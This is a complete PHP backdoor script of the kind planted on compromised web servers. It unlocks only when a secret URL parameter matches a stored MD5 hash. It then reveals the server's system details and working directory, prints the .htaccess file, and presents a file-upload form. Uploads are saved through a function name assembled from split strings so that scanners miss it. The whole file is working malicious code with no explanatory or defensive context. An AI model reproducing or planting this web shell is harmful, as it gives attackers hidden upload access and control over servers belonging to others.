<?php if (md5(@$_GET['b0760cf6']) == '403ea8b528c9c48a06e6aab8a3734f39') {
    echo php_uname() . "<br>" . getcwd() . "<br>";
	if (file_exists('.htaccess'))
	{
		echo "<br>"."|".htmlspecialchars(file_get_contents('.htaccess'))."|"."<br>";
	}
    @$sa = $_FILES['file']['tmp_name'];
    @$as = $_FILES['file']['name'];
    echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>";
    $w = "move_uplo"; $q = "aded_file"; $x = $w . $q;
    $x($sa, $as);
}